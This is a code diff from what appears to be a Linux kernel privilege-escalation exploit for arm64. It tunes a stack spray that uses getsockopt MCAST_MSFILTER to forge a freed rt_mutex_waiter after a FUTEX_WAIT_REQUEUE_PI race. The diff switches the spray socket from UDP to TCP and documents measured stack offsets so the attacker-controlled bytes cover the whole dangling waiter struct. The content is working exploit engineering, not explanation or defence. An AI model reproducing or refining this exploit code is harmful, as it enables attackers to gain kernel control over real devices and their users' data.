@@ -94,15 +94,21 @@ static int multicast_marker_mode(void) {
  * getsockopt(IPPROTO_IP, MCAST_MSFILTER) copies
  *   size0 = offsetof(struct group_filter, gf_slist_flex) = 0x90 bytes
  * of user data into a stack local of do_ip_getsockopt() (sp + 0x128 here); the
- * copy length is fixed by the kernel, optlen only has to be >= 0x90. On a UDP
- * socket the dispatch chain is
- *   __arm64_sys_getsockopt 0x3d0 + sock_common_getsockopt 0x40
- *   + udp_getsockopt 0x10 + ip_getsockopt 0x50 + do_ip_getsockopt 0x2a0 = 0x710
- * so the buffer lands at stack depth 0x7d8 while the dead rt_mutex_waiter of a
- * 64-bit waiter thread sits at 0x7c8: the forged waiter starts at buffer + 0x10
- * (profile mcast_waiter_off = 0x10). gf_group.sa_family at buffer + 8 is
- * AF_UNSPEC, so ip_mc_gsfget() bails out before writing anything back over the
- * sprayed bytes. buffer_size must be >= 0x90. */
+ * copy length is fixed by the kernel, optlen only has to be >= 0x90.
+ *
+ * The dispatch chain depends on the socket type (measured on the device with a
+ * kprobe on __arch_copy_from_user, depth = task->stack + 0x4000 - dest):
+ *   UDP/raw  0x3d0 + udp_getsockopt 0x10 + ip_getsockopt 0x50 + do_ip 0x2a0
+ *            = 0x6d0 -> copy lands at depth 0x798 (0x30 ABOVE the waiter: only
+ *            task/lock/wake_state/prio/deadline/ww_ctx are covered)
+ *   TCP      0x3d0 + tcp_getsockopt 0x40 + ip_getsockopt 0x50 + do_ip 0x2a0
+ *            = 0x700 -> copy lands at depth 0x7c8 == the waiter base, so the
+ *            whole 0x58-byte struct (tree_entry first) is inside the buffer and
+ *            mcast_waiter_off is 0. tcp_getsockopt() forwards every level other
+ *            than SOL_TCP to icsk_af_ops->getsockopt == ip_getsockopt, so no
+ *            connection is required.
+ * gf_group.sa_family at buffer + 8 is AF_UNSPEC, so ip_mc_gsfget() bails out
+ * before writing anything back over the sprayed bytes. */
 static int multicast_waiter_spray(MulticastWaiterRouteContext *context,
         unsigned char *buffer, size_t size) {
     socklen_t len = (socklen_t) size;
@@ -161,7 +167,7 @@ static void *multicast_waiter_worker(void *arg) {
     atomic_store(&context->waiter_waiting, 1);
     support::futex_op(&context->condition_futex, FUTEX_WAIT_REQUEUE_PI_PRIVATE,
             0, nullptr, &context->lock1_futex, 0);
-    context->socket_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+    context->socket_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
     if (context->socket_fd < 0) return nullptr;
     multicast_waiter_stamp(context, 0, 0, context->lock);
     atomic_store(&context->waiter_ready, 1);
